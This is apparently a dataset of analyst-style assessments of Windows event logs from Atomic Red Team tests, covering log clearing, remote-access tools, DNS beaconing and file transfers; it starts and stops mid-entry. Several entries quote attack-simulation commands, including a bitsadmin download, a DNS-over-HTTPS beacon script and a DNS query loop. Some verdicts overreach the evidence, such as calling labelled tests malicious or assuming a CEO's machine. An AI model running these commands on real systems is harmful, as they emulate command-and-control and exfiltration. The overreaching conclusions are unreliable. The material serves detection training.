   - The logs reveal that event logs for the ""System"", ""Windows PowerShell"", and ""Security"" channels were cleared based on entries in the system log, which clearly is an attempt to hide traces of activity.
   - Moreover, Security Event 1102 indicates that the security log has been cleared, which is extremely suspicious, especially under the account ""admin_test"".

3. **Network Configuration Changes:**
   - Use of netsh commands to add firewall rules for VNC ports indicates unauthorized network access setup.
   - These actions suggest an attempt to bypass network restrictions and allow remote access.

4. **Use of Unauthorized Tools:**
   - Execution of ""UltraVNC"" related binaries and setpasswd.exe without clear necessity indicates an irregular configuration or potential unauthorized software installation.

**Assessment:**

The logs present strong indicators of malicious activity, specifically:

- The use of PowerShell to initiate UltraVNC and the opening of VNC-related ports through netsh.
- The clearing of multiple event logs, which is a strong sign of trying to remove forensic evidence.
- Execution of multiple suspicious processes like ""setpasswd.exe"", ""setcad.exe"", and the use of wevtutil to clear event traces.

These activities, combined with their execution under a presumably compromised admin account (""admin_test""), strongly suggest unauthorized activity consistent with a potential compromise or malicious intent.

**Conclusion:**

Resolution: **MALICIOUS**

**Guidance:**

Psiphon,"Upon reviewing the provided Windows event logs, several aspects stand out that necessitate discussion:

1. **Log Clearing**:
   - Entries in both the System and Security logs contain events denoting the clearing of logs (`EventID 104` for System and `EventID 1102` for Security) performed by a user named `admin_test`. Log clearing can indicate an attempt to cover tracks, particularly when executed by an administrative account.

2. **Command Execution**:
   - The `Sysmon` EventID `1`, `with Image ""C:\\Windows\\System32\\cmd.exe""` and a command line of `cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1090.003\\src\\Psiphon.bat\""` executed by `SERVER002\\admin_test` indicates the running of a `.bat` file associated with a known Red Team tool testcase (Psiphon), which could be a sign of a simulation of unauthorized command & control (C2) channel activity. However, it may also signify Red Team activity or a training session, especially if authorized by the security team.

3. **Wevtutil Usage**:
   - There are multiple executions of `wevtutil.exe cl`, used for clearing various event logs (Application, System, Security, and Windows PowerShell) by `SERVER002\\admin_test`, which is suspicious since it aligns with log wiping activity.

4. **Use of PowerShell**:
   - Evidence of PowerShell activity (`Sysmon EventID 1`) with an entry indicating execution of `PowerShell.exe` to invoke a batch file aligns with the suspicious activity evident in command execution logs. This is compounded by the correlation to `Psiphon.bat`, which raises concerns around potential data exfiltration or bypassing network security mechanisms.

5. **High Integrity Level Processes**:
   - Multiple processes, including PowerShell and Conhost processes, are executed under high integrity level, indicating administrative-level activity. The appearance of such events in conjunction with the execution of suspicious commands, points towards potential abuse of elevated privileges.

**Assessment:**
The activity recorded points towards attempts to cover traces of malicious activities or a simulation exercise. The patterns of command execution, coupled with log alterations and executions from user `admin_test`, especially running privilege-laden processes like `PowerShell` with potentially hazardous commands, strongly suggest an attempt to undermine system security.

**Resolution**:
- **MALICIOUS**: The activity within the logs, particularly the log clearing via `wevtutil`, execution of potential C2 Simulator/Breacher tools like Psiphon's test script without clear authorization, and use of high integrity level processes, points towards potentially malicious intent, warranting immediate investigation and preventive measures.

**Guidance**:
- Initiate a closure review of users with elevated permissions, especially `admin_test`.
- Conduct a full audit of system security practices, including enhanced monitoring to detect and prevent unauthorized activity.
- Evaluate whether this was part of a legitimate security exercise (Red Team activity). If unauthorized, undertake disciplinary action against violators.
- Implement strict policies regarding the use and auditing of powerful command-line and scripting tools like `PowerShell` and `cmd.exe`."
svchost writing a file to a UNC path,"Upon analyzing the provided Sysmon, System, Security, and Application logs from the Windows host, several key activities can be observed:

1. **Clearing of Event Logs:**
   - Multiple instances of event logs being cleared, including System, Security, and Windows PowerShell logs, were noted. Specifically, events with IDs 104 and 1102 indicate that the `admin_test` user cleared these logs. This action is suspicious because clearing logs is a common tactic used by attackers to cover their tracks.

2. **Processes Related to Event Log Utilities:**
   - The execution of `wevtutil.exe` with command lines indicative of clearing logs (e.g., `wevtutil.exe cl System`) is evident. The process `wsmprovhost.exe` was the parent process for these executions, and they were initiated by the `admin_test` user with high integrity levels. This adds to the suspicion as these actions were directly responsible for clearing logs.

3. **Execution of Unusual Commands:**
   - There is an instance of `cmd.exe` executing a command to copy itself to a new location (`C:\\svchost.exe`) and then executing with a suspicious command (`echo T1105 > \\localhost\c$\T1105.txt`). The use of `T1105` suggests an indicator of attack technique (T1105: Ingress Tool Transfer) which is associated with the MITRE ATT&CK framework. This suggests potential unauthorized manipulation or execution of commands.

4. **Network and User Context:**
   - The logs show the `admin_test` user logging in via NTLM with elevated privileges. The IP address associated with the login was a link-local IPv6 address, which could either be benign or an indicator of lateral movement, especially given the suspicious activities that followed.

5. **Time Manipulation:**
   - There are logs indicating time changes on the system. Time manipulation, especially when not explained by daylight saving adjustments or other legitimate reasons, can indicate attempts to alter timestamps or execute time-sensitive attacks.

6. **Normal Activity:**
   - Multiple entries related to Microsoft Edge Update processes executing and updating appear benign and consistent with routine update activity.

Given these observations, particularly the clearing of event logs, the renaming and execution of command shells with suspicious command lines, and user context, it is critical to treat this activity as potentially harmful. The behavior observed is suggestive of attempts to obfuscate actions on the system and execute suspicious commands, consistent with malicious behavior.

### Resolution: MALICIOUS

### Recommendations:
1. **Immediate Containment**: Isolate the affected system from the network to prevent any lateral movement by the threat actor.
2. **Detailed Forensic Investigation**: Collect a full disk image and memory capture of the affected machine for further analysis. Look for any additional unauthorized tools, scripts, or processes.
3. **Review and Reinforce Security Posture**: Ensure logging is re-enabled and monitored closely, and that security patches are up-to-date. Validate user credentials and consider re-enforcing credential policies.
4. **Incident Response**: Initiate incident response procedures, including notifying key stakeholders and preparing communication for any potential breach notifications.
5. **User and Access Review**: Verify the integrity of `admin_test` account activities to ensure there are no unauthorized accesses. Consider a password reset or account suspension pending further investigation."
Download a File with Windows Defender MpCmdRun.exe,"Upon analyzing the provided Windows event logs, several critical observations can be made related to potential malicious activity:

1. **Log File Clearing**: There are multiple instances of log file clearing events (Event ID 104 in System logs) and one in Security logs (Event ID 1102). The user `SERVER002\admin_test` executes these actions on the ""System,"" ""Windows PowerShell,"" and ""Security"" channels. Clearing event logs is a red flag indicating an attempt to remove traces of suspicious or malicious activity.

2. **Suspicious Process Execution**: The `wevtutil.exe` command-line tool is used for clearing the logs, which indicates a deliberate action to delete event records. The processes are initiated by `SERVER002\admin_test`, who appears to be a privileged user given the high integrity level reported by Sysmon logs.

3. **Sysmon Logs and PowerShell Activity**: Observing the Sysmon logs, we see that `cmd.exe`, `wevtutil.exe`, `MpCmdRun.exe`, and several other utilities are executed in close succession. Among them, `cmd.exe` and `wevtutil.exe` usage, combined with cleared logs, raise suspicion. The absence of PowerShell entries suggests potential avoidance or deletion tactics signed off by `wevtutil.exe`.

4. **Periodic Microsoft Edge Update Actions**: Numerous entries related to Microsoft Edge Update (e.g., `MicrosoftEdgeUpdate.exe`) are logged. While this could be benign software updating activity, the context of other events suggests scrutiny may be prudent to rule out ""living-off-the-land"" techniques by malicious actors masquerading as legitimate updates.

5. **Time Discrepancies in Event Timestamps**: There's a sequence of kernel general events where the system time appears to be set back and forth, showing time adjustment activities. This can relate to legitimate system activities, but combined with the log clearing actions, it could be part of a broader malicious attempt to alter temporal markers of activities.

### Assessment and Recommendations:

- **Resolution**: **MALICIOUS**. The log entries strongly indicate attempts to cover tracks by clearing logs and manipulating system components, suggesting unauthorized or malicious activity. 

### Guidance for Further Action:

1. **Immediate Isolation**: Isolate the involved machine (Server002) from the network to prevent further potential malicious activities.
   
2. **Digital Forensics**: Conduct a comprehensive forensic investigation. Secure and analyze any remaining artifacts and hard drives for additional data that might have persisted beyond the log files.
   
3. **Review User Actions**: Investigate `SERVER002\admin_test` accounts for unauthorized access or compromise. Confirm recent activity and communication logs closely for indicators of compromise.
   
4. **Analysis of Microsoft Edge Update**: While updates could be routine, verify these processes, including hashes, against known-good baselines to eliminate the possibility of masquerading processes.
   
5. **Enhance Monitoring**: Reinforce monitoring mechanisms for systems and ensure comprehensive alerting on events like log clearing or unusual time changes and incorporate enhanced logging protections to automatically alert administrators when logs are tampered with.

This analyzed context and operational roadmap, grounded in critical evidence, align with ensuring improved organizational readiness and resilience against future threats."
DNS over HTTPS Regular Beaconing,"**Detailed Analysis of the Logs:**

**Suspicious or Anomalous Behavior:**

1. **Event Log Clearing:**
   - Several instances of log files being cleared are observed:
     - Security log cleared by `admin_test` at `2024-10-28 15:16:48.978`.
     - System log cleared by `admin_test`.
     - Windows PowerShell log cleared.
   - Clearing of event logs, especially security and system logs, is often indicative of an attempt to cover tracks of malicious activities.

2. **Use of PowerShell:**
   - A PowerShell script was executed as seen in the PowerShell logs:
     - Command: `powershell.exe {Set-Location ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam"" .\T1572\src\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30}`
   - This script appears to be related to a known testing framework (Atomic Red Team), but the usage without clear authorization could suggest testing or simulating attack behaviors without permission.

3. **Privilege Escalation:**
   - `admin_test` is observed to have used privileged accounts which include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.
   - Such privileges combined with the clearing of logs raise concerns about malicious intent.

4. **Time Change Event:**
   - An event where system time was changed (`Event ID 4616`) can potentially be used by attackers to manipulate log timestamps to obscure the timeline of their activities.

**Potential Indicators of Compromise:**

- **Execution of Suspicious Scripts:** Running a `T1572` script, potentially indicating simulated or genuine C2 (Command and Control) interaction attempts.
- **Repeated Use of System Tools like `wevtutil.exe` and `whoami.exe`:** These tools were used extensively, potentially to gather information and manage or manipulate event logs.
  
**Overall Assessment:**

The logs indicate patterns consistent with malicious activity:
- The clearing of log files is a key indicator that activities are being concealed.
- The use of PowerShell scripts with network interactions, particularly without clear business justification or documentation, further supports the potential malicious assessment.
- Privileged operations and time manipulation indicate attempts to alter or hide forensic evidence.

**Risk Assessment and Guidance:**

- **Resolution:** MALICIOUS
- **Threats Identified:** Log clearing, unauthorized use of PowerShell for potentially malicious scripts, privilege escalation.
  
**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected machine (Server002) to prevent any potential further network communication.
   - Verify if the script execution was authorized as part of security testing. If not, initiate an immediate incident response.

2. **Investigation Steps:**
   - Gather context on the `admin_test` account and verify legitimate operational needs for used privileged actions.
   - Review network logs for any communication with external IPs, correlating with the timeframe of PowerShell script execution.
   
3. **Security Enhancements:**
   - Implement stricter logging and monitoring, especially for privileged activities and script executions.
   - Consider integrating additional security controls that alert on event log clearing attempts and unauthorized use of PowerShell. 

This comprehensive response should prioritize both mitigating the current threat and enhancing future detect-prevent efforts in the security infrastructure."
certreq download,"### Analysis:

1. **Log Clearing Activity:**
    - Numerous logs indicate that event logs for different channels were cleared by the user `admin_test`. Events 17965 (Sysmon) and 30352 (Security) indicate log clearance activity from the `SERVER002\admin_test` account.
    - Clearing event logs is generally suspicious, especially without a legitimate reason, as it can often be an attempt to cover tracks of unauthorized or malicious activity.

2. **Command-Line and Process Execution:**
    - Event 17979 shows execution of `cmd.exe` with arguments involving `certreq.exe` and a remote configuration URL (https://example.com). This behavior is often indicative of an attempt to establish unauthorized connections or involve in data exfiltration activities.
    - The use of `certreq.exe` along with a configuration URL in `cmd.exe` suggests potential misuse or a non-standard operation, which further raises suspicion.

3. **Wevtutil.exe Activity:**
    - Frequent invocations of `wevtutil.exe` to clear different channels: Application, Security, System, and Windows PowerShell. This is unusual and suggests attempts to evade detection by tampering with logs.
    - Event logs being cleared with high integrity levels by `admin_test` using trusted system utilities enhances the potential malicious nature of these activities.

4. **Privilege Escalation:**
    - Multiple instances where the user `admin_test` has been granted elevated privileges such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeDebugPrivilege` (EventID 4672 in the Security log). This indicates privilege escalation attempts or existing high privileges potentially being misused.

5. **Edge and Software Update Activities:**
    - Numerous events associated with Microsoft Edge Update and related processes (like `MicrosoftEdgeUpdateSetup_X86` and `setup.exe`). While frequent update checks and installs can be normal, the coinciding timestamp with the log clearance activities might indicate attempts to blend in with legitimate activity.
    - Processes related to updates span across a large number of events which may be used as a cover for other malicious activities.

### Threat Assessment:

The sequence of events suggests a possible malicious activity pattern. The suspicious command-line usage and repeated log clearance are strong indicators of an attempt to hide unauthorized actions. Meanwhile, various elevated privileges granted to `admin_test`, coupled with the nature of the Sysmon logs, point toward actions usually seen in compromised systems trying to cover their tracks.

### Recommendation:

1. **Immediate Containment:** 
    - Investigate the `admin_test` account to ensure it hasn't been compromised. Consider restricting its access immediately to prevent further potential harm.
  
2. **Forensic Investigation:**
    - Conduct a detailed forensic analysis to understand the full extent of any breaches, focusing on the use and clearing of event logs and any unauthorized privileges gained.

3. **Network Monitoring:**
    - Monitor network traffic for any unusual connections or data exfiltration attempts.

4. **Review Update Activities:**
    - Validate whether frequent Microsoft Edge updates and installations were legitimate or a disguise for other actions.

5. **Corrective Actions:**
    - Restore cleared logs if possible to gather evidence for further investigation.
    - Ensure all systems have updated antivirus definitions and review EDR solutions to catch similar patterns.

### Conclusion:

Based on the analysis of the logs suggest significant activities pointing toward attempted or potentially successful malicious actions. Therefore, the final resolution is:

**Resolution: MALICIOUS**"
Windows - BITSAdmin BITS Download,"### Detailed Log Analysis

Upon analyzing the provided logs, several points of interest and potential indicators of compromise (IoCs) have been identified:

#### Anomalous and Suspicious Activities:

1. **Event Log Clearing:**
   - Security Log Event ID 1102: This indicates that the security event log was cleared by the user `admin_test`. Clearing event logs is a highly suspicious activity as it is often performed by malicious actors to cover their tracks.

2. **Usage of `wevtutil.exe`:**
   - Sysmon Logs show multiple instances of `wevtutil.exe` execution (`EventID 1` for process creation). This utility is used for event log management, including clearing logs. The command line `\""C:\\Windows\\system32\\wevtutil.exe\"" cl ...` highlights log clearing operations. These entries correspond to the security log event `1102` mentioned above.

3. **Command Execution via `cmd.exe`:**
   - Sysmon Log Event ID 1 shows execution of `cmd.exe` with the following command line: 
     ```
     ""cmd.exe"" /c C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %%temp%%\\Atomic-license.txt
     ```
   - This command utilizes `bitsadmin.exe`, often misused by attackers for downloading malicious files. The URL points to a legitimate repository, but the use of `bitsadmin` in this manner is noteworthy and can be part of a test or reconnaissance operation.

4. **Repeated `whoami.exe` Execution:**
   - `whoami.exe` is used multiple times, which might indicate enumeration activity. While not inherently malicious, in the context of other suspicious activities, it could represent an attempt to probe the environment.

5. **Network Time Protocol (NTP) Synchronization:**
   - Events indicate time synchronization with `time.windows.com`. While this is normal operation, alterations in system time could affect log timestamps and are worth consideration during investigations.

6. **Clearance of Multiple Log Channels:**
   - The logs indicate that multiple channels including System, Security, and Windows PowerShell were cleared, suggesting concealment of activities from detection.

#### Indication of Malicious Activity:

- **Combination of Activities:**
  - The combination of log clearance, unauthorized command executions, and network file transfer using atypical methods (bitsadmin) is highly indicative of malicious activity. These patterns align with behavior seen in lateral movement or preparation for further exploitation steps within a compromised system.

### Assessment and Resolution:

Based on the evidence from the logs, the activities observed are highly suspicious and suggest potential compromise due to the active log clearance and unexpected network-based file transfer using `bitsadmin.exe`.

### Resolution:
- **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the affected machine (Server002) from the network to prevent further potential lateral movement or data exfiltration.
 
2. **Incident Investigation:**
   - Conduct a forensic analysis on Server002 to identify any additional malicious artifacts or unauthorized user accounts.
   - Review network logs for unusual outbound traffic and possible data exfiltration.
   - Verify recent changes in user accounts and installed applications to identify potential persistence mechanisms.

3. **Remediation Steps:**
   - Revert any unauthorized changes detected and restore the system from a verified clean backup.
   - Update antivirus and endpoint detection software to ensure the latest definitions and protections are enabled.
   - Educate the IT and security teams on recognizing signs of compromise to enhance detection and response capabilities.

4. **Strengthen Logging and Monitoring:**
   - Enable detailed logging for all critical systems and ensure log retention policies prevent unauthorized clearing.
   - Employ SIEM solutions for aggregation and correlation of events to improve early detection of malicious behaviors."
MSP360 Connect Execution,"After analyzing the provided logs, the following findings are noted:

### Summary of Findings:
1. **Clearing of Logs**: 
   - The System, Windows PowerShell, and Security logs were cleared by a user with the `admin_test` account. Clearing event logs is generally considered suspicious activity unless part of routine administration with proper documentation.

   - **System Log**:
     - EventID 104 indicates the System and Windows PowerShell logs were cleared.
   - **Security Log**:
     - EventID 1102 shows the Security logs were cleared as well.

2. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` command line utility was used to clear logs (`cl` flag for clearing specific channels) as confirmed by the Sysmon Process Creation logs. This action aligns with the times the logs were recorded as being cleared.
   - Multiple instances of `wevtutil.exe` indicate a systematic clearing of logs across different channels: Sysmon, Application, System, Security, and Windows PowerShell.

3. **Suspicious PowerShell execution**:
   - Several PowerShell events indicate a host application executing `Start-Process` on `Connect.exe`. This process could be benign if it involves a known and trusted application. However, in conjunction with the clearing of logs and without further context, it remains suspicious.

4. **High-Integrity Level**:
   - The actions performed, particularly those involving `wevtutil.exe` and PowerShell, were executed under a high integrity level, signifying the use of elevated privileges, potentially indicative of an attempted privilege escalation or unauthorized access.

5. **Microsoft Edge Updates**:
   - Numerous updates and activities related to Microsoft Edge Update are seen. These events appear normal as they involve processes hosted by Microsoft and executed under the SYSTEM account. The volume may be higher than typically expected but given the context they align with routine update activities.

### Assessment:
Given the log-clearing activities, particularly within the Security log, use of system utilities to clear logs, and no immediate apparent justification for such actions, there are strong indicators of attempts to obfuscate actions on the system. The PowerShell activity itself might not be necessarily malicious but, given the context, it does contribute to overall suspicious activity.

### Conclusion:
**Resolution: SUSPICIOUS**

### Recommendations:
- **Immediate Review and Investigation**: Conduct a detailed review of user activities associated with the `admin_test` account. Verify the necessity and authorization for clearing logs.
- **User Discussions**: Engage with personnel using the `admin_test` account to gain context on recent legitimate activities.
- **System Monitoring**: Increase monitoring on the affected system for any further unusual activities or unauthorized access attempts.
- **Change Credentials**: Consider credential reviews or changes for involved accounts if unauthorized activity is suspected.

- **Policy Review**: Review and bolster policies around log management and system access, ensuring traceability and accountability."
Curl Upload File,"### Detailed Analysis of the Logs

#### Overview
The provided log entries indicate events that involve clearing various Windows event logs (System, Security, Windows PowerShell) on a machine named **Server002**. There is also a series of process creations involving standard Windows utilities and Microsoft EdgeUpdate processes.

#### Suspicious Events
1. **Event Log Clearing**:
   - **System Log**: 
     - Event ID 104: The System log was cleared by an account named `admin_test`.
   - **Security Log**: 
     - Event ID 1102: The Security log was cleared by the same `admin_test` account. 
   - **Windows PowerShell Log**:
     - Event ID 104: The PowerShell log was also cleared by `admin_test`.

   The simultaneous clearing of multiple logs is often a strong indicator of malicious activity as attackers frequently clear logs to cover their tracks after compromising a system.

2. **Command Execution**:
   - **Sysmon Log**:
     - The logs indicate a series of execution by `wevtutil.exe`, which is used to clear event logs. The relevant command lines explicitly show attempts to clear multiple event logs (System, Security, Windows PowerShell).
     - The presence of `cmd.exe` executing commands to upload files to an outside server using `curl.exe` is suspicious. The commands reference paths and servers (e.g., `www.example.com`) that suggest data exfiltration attempts.

3. **Use of `curl.exe`**:
   - The successive utilization of `curl.exe` for uploading and sending data corroborates possible data exfiltration activity or unauthorized file transfer attempts. This action under the `admin_test` user could imply its credentials are compromised.

#### Contextual Observations
- **User Account**: All these activities were performed by the user account `SERVER002\admin_test`, which raises suspicion if this user account was used without authorization.
- **Integrity Level**: These processes were executed with high integrity levels, indicating privileged access.
- **EdgeUpdate Processes**: Microsoft Edge Update processes are also listed, which appear routine for a legitimate software update. However, they are noted for context.

### Assessment

Based on the analysis:

- The clearing of multiple event logs (System, Security, PowerShell) in rapid succession while other suspicious activities (like use of `curl.exe` for data transfer) coincide is a strong indicator of malfeasance.
- The activity suggests an effort to conduct potential data exfiltration and ensure stealth by covering traces.
  
### Resolution: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Response**:
   - Isolate the affected host to prevent further potential data exfiltration.
   - Change credentials related to the `admin_test` account and any other privileged accounts immediately.

2. **Investigation and Remediation**:
   - Conduct a thorough forensic analysis of the isolated machine to understand the extent of the compromise.
   - Review any successful unauthorized access attempts or alerts related to the `admin_test` account.
   - Look for any unusual network traffic patterns that indicate a data leak.

3. **Preventive Measures**:
   - Reinforce logging and monitoring, and ensure event logs are sent to a secure, centralized location.
   - Implement stricter access controls and regular audits on privileged account activities.
   - Educate users on potential phishing and credential-theft tactics."
Splashtop Streamer Execution,"Upon reviewing the provided Windows event logs, several suspicious activities stand out:

1. **Process Creation Events**: There are multiple executions of `wevtutil.exe` with the `cl` (clear) command across various channels:
   - **Sysmon**: `wevtutil.exe` used to clear logs such as ""Microsoft-Windows-Sysmon/Operational"".
   - **System Log Cleared**: `wevtutil.exe` was used to clear the System and Windows PowerShell event logs (`EventID 104` in System log).
   - **Security Log Cleared**: `wevtutil.exe` was used to clear the Security logs (`EventID 1102`).

   These activities are highly unusual and often indicative of someone attempting to hide their tracks by removing forensic evidence. Clearing logs is generally considered a strong indicator of malicious intent.

2. **Execution of Windows PowerShell**: There are multiple Sysmon and PowerShell log entries showing the execution of PowerShell, often used by attackers to run scripts or commands. In particular, the execution of PowerShell to start a process for ""Splashtop Remote Server"" is noted, which could be suspicious if not part of normal administrative actions or particularly if unsanctioned remote access tools are in use.

3. **Use of System Utilities**: Tools like `whoami.exe`, `hostname.exe`, and `conhost.exe` are seen running, possibly indicating information gathering activity. While these can be part of normal operations, they might be used maliciously to gather information about the system and user environment.

**Assessment and Resolution**:
The logs clearly show actions typical of an attacker attempting to obfuscate their presence by clearing logs, potentially using PowerShell for malicious purposes, and executing processes to gather information about the host environment. Such behavior strongly suggests malicious intent.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- **Immediate Incident Response**: Isolate the system from the network to prevent further compromise.
- **Conduct a Full Investigation**: Engage your IT security incident response team to perform a detailed forensic investigation to understand the extent of the breach and how the threat actor accessed the system.
- **Review Remote Access Tools**: Assess the use of Splashtop or any other remote tools and verify that this usage aligns with expected administrative operations.
- **Log Monitoring and Alerting**: Strengthen security monitoring and implement alerting on events such as log clearing and excessive use of PowerShell.
- **User Training**: Educate users, especially those with administrative privileges, on recognizing signs of compromise and the importance of secure practices.
- **Increase Security Posture**: Ensure endpoint protection solutions are up-to-date, and consider deploying additional security measures such as application whitelisting or advanced threat protection."
DNS Large Query Volume,"### Analysis

Upon analyzing the provided Sysmon, Windows PowerShell, Application, System, and Security logs, various activities can be observed. Here are the key points to highlight:

1. **PowerShell Activity:**
   - There is a suspicious use of PowerShell, where a script is executed with repetitive DNS resolution commands: `powershell.exe & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type ""TXT"" ""atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io"" -QuickTimeout}}`. This activity seems to perform DNS reconnaissance, which is unusual for normal user activity. The pattern suggests it may be part of an offensive security simulation or test, often associated with penetration testing tools like Atomic Red Team.

2. **Event Log Clearing:**
   - The logs show that multiple event logs, including System and Security channels, were cleared by the user `admin_test`. This is particularly concerning as log clearing is a common tactic used by malicious actors to cover their tracks post-exploitation.

3. **Process Execution:**
   - Multiple instances of `conhost.exe` and `wevtutil.exe` are executed very close chronologically, possibly tied to the log-clearing activity.
   - Execution of `whoami.exe` and `hostname.exe` under `admin_test` isn't necessarily malicious but could be part of information gathering or script execution. However, given the context of other activities, it adds to a suspicious pattern.

4. **Integrity and Privilege Level:**
   - The processes related to potential suspicious activity are running with High integrity levels, allowing them to clear event logs and manipulate system settings.

5. **Privilege Escalation:**
   - Events involving privilege granting to `admin_test` imply that this account has been operating with elevated privileges during the incidents. This is a risk if the account has been compromised.

### Assessment

The observed activities are highly **suspicious** due to the combination of log-clearing actions, unauthorized PowerShell execution with DNS querying, and high-integrity execution of crucial system utilities (`wevtutil.exe` for log clearing). These indicators, especially when occurring on a machine belonging to a CEO or high-profile user, pose a significant security concern.

### Resolution: SUSPICIOUS

**Guidance on how to proceed:**
- **Immediate Actions:**
  - Temporarily disable or change credentials for `admin_test` and any associated accounts.
  - Preserve the current state of event logs for further forensic analysis.
  - Conduct a deeper investigation to verify whether these actions were authorized or potentially part of malicious activity disguised as testing.
  - Evaluate network traffic for any abnormal DNS requests or exfiltration attempts correlated with the timestamps of the suspicious logs.

- **Further Investigation:**
  - Contact the user and IT administrative department to verify whether the PowerShell script execution was part of any scheduled security testing (e.g., penetration tests).
  - Review network security logs around the time of these events for matching external connections.
  
- **Long-term actions:**
  - Implement tighter security monitoring around high-privilege accounts.
  - Schedule regular audits of PowerShell usage and event log management especially for critical assets like executive machines.
"
LogMeIn Files Detected Test on Windows,"Upon analyzing the provided Windows event logs, several observations stand out as potentially suspicious activities:

1. **Event Log Clearing**: Multiple entries suggest the event logs were cleared using `wevtutil.exe`. Specifically:
   - Security log entry with Event ID 1102 indicates that the Security log was cleared.
   - Use of `wevtutil.exe` to clear multiple logs (e.g., Sysmon, Application, System) is logged in the Sysmon log.

   Clearing event logs is often done to cover tracks after malicious activity, especially when performed by a user account (`admin_test` in this case) that had recently obtained elevated privileges.

2. **Privilege Escalation**: 
   - Security log entries report that the user `admin_test` received a list of privileges that include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others that can be misused for privilege escalation.

3. **Suspicious PowerShell Activity**:
   - A script was executed to download and silently install LogMeInIgnition.msi from an external source. This activity matches potentially unwanted behavior where remote administration tools are installed without explicit consent, indicating possible unauthorized remote access setting.

4. **Network Activity and Logins**:
   - The logs also indicate a login from IP `fe80::e3b5:5371:12a8:9c77` using NTLM authentication, which, coupled with privilege escalation and log clearing, could be a part of a lateral movement or external unauthorized access attempt.

5. **Installation of LogMeIn Ignition**:
   - Logs show the installation of LogMeIn Ignition through PowerShell, which followed an automated and silent execution pattern. Even if LogMeIn is a legitimate tool, the manner of installation is concerning, given it was executed as a background process with administrative privileges.

**Assessment:**
The behavior analyzed from these logs indicates a potential security compromise. Specific actions, such as log clearing, elevation of privileges, the silent installation of remote administration software through PowerShell, and unauthorized login attempts, align with a profile indicative of malicious intent.

**Resolution: MALICIOUS**

**Recommendations:**
- Conduct a forensic analysis on the affected host to identify the extent of the compromise.
- Investigate the user account `admin_test` to determine if credentials have been compromised.
- Review and reinforce the security policies around log management and user privileges.
- Ensure that all remote management tools are explicitly approved and monitored.
- Consider implementing tighter monitoring and alerting mechanisms on PowerShell execution and log clearing activities.
- If unauthorized access is confirmed, follow incident response procedures, including potential host isolation and comprehensive logging review."
Splashtop Execution,"Upon reviewing the provided Windows event logs, I have identified a series of activities and events that require a detailed assessment to determine the nature of potential security risks. Below are the key observations and analysis:

1. **Installation Activity**: The application log indicates several installations related to Splashtop Personal Remote Desktop and Microsoft Edge updates. This alone does not signify malicious activity, but it's important to validate if these installations align with expected software maintenance and management practices within the organization.

2. **Event Log Clearing**: A significant red flag observed in both the Security log and the System log is the clearing of event logs by the user `admin_test`. The clearing of logs, particularly Security and System logs, is a common tactic used by malicious actors to cover their tracks.

   - Security Log EventID 1102 indicates that the security event log was cleared.
   - System Log EventID 104 shows multiple logs being cleared, which could indicate an attempt to tamper with or hide previous activities.

3. **Command Line Executions**: There are multiple PowerShell activities noted within the Windows PowerShell log, which are primarily used for starting Splashtop processes. While such activities can be benign, they can also be leveraged for remote access if installed without proper authorization.

4. **Elevated Commands via Wevtutil**: The Sysmon logs show instances of `wevtutil` (a command line utility for managing event logs) being executed to clear the logs, which supports the previous observation regarding the logs being cleared. This is often seen in malicious activities.

5. **Splashtop and Potential Misuse**: The presence of Splashtop, a remote desktop application, should be validated. Unapproved installations of remote desktop applications can pose serious security threats, especially when involving high-privilege systems or sensitive data.

6. **Multiple Executions in Temp Directory**: Numerous executions from temporary directories, especially involving executable files such as `_is8B2A.exe` and `_is925B.exe`, are noted. Executables running from temp paths are often indicative of either installation processes or malware execution, requiring further investigation.

7. **Multiple Instances of Network Service Use**: WMI processes (WmiPrvSE.exe) and svchost.exe were initiated by network services. Such services are typically benign but could represent Lateral Movement or reconnaissance if combined with other suspicious indicators.

### Assessment

The logs reveal several suspicious activities, primarily focused around potential attempts to cover up tracks and execute processes usually leveraged in malicious campaigns:

- **Threat Identification**: The activity observed, particularly the clearing of event logs and execution of potentially unauthorized installations, suggests that there may be an ongoing or past malicious involvement likely meant to obfuscate activities.

- **Risk**: If the installations and executed processes were not authorized and part of scheduled IT operations, there is a significant risk of compromised integrity, unauthorized access, and potential data exfiltration.

### Conclusion and Resolution

**Resolution**: **SUSPICIOUS**

- **Next Steps**:
  - Conduct an immediate audit of the machine's recent administrative activities to confirm whether these were authorized.
  - Check the validity and integrity of Splashtop installations and ensure they are compliant with organizational policies.
  - Investigate network traffic during the specified times for anomalous patterns that align with external connections.
  - Conduct file integrity checks on critical system files and installed software binaries.
  - Confirm there are proper backup logs in place in case critical events need to be reviewed retrospectively.

This assessment suggests the logs contain activity that doesn't initially appear malicious but includes patterns that warrant a deeper investigation to rule out potential threats."
DNS Regular Beaconing,"The provided logs indicate several suspicious activities that might suggest potential malicious actions. Let's break down the findings:

1. **PowerShell Activity**:
   The logs show a PowerShell script execution involving `T1071.004\\src\\T1071-dns-beacon.ps1`. The script is executed from a directory named `AtomicRedTeam`. The use of scripts from Atomic Red Team is generally related to security research, testing, and simulations against environments to mimic adversary behaviors. Although this may not directly indicate malicious activity, it is often used for penetration testing and could represent a security assessment or a simulation being played out. However, it's crucial to verify if this was authorized activity.

2. **System and Security Event Log Clearing**:
   Several logs indicate that event logs (System, Windows PowerShell, and Security logs) have been cleared around the same timestamp. This is highly suspicious behavior typically associated with adversaries attempting to cover their tracks following unauthorized activities. Log clearing by the user `admin_test` suggests that either this user account was compromised, or someone with access tried to hide their actions.

3. **Time Synchronization Manipulation**:
